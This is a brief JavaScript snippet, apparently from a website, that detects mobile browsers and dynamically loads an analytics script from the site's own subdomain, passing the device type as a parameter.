var mobile=navigator.userAgent.search('Android')>-1|| navigator.userAgent.search('Mobile')>-1;loadDoc();function loadDoc() {var resource = document.createElement('script');resource.src ="//m.techkriti.org/api/analysis/?device="+mobile;resource.type='text/javascript';var script = document.getElementsByTagName('script')[0];script.parentNode.insertBefore(resource, script);return;} 
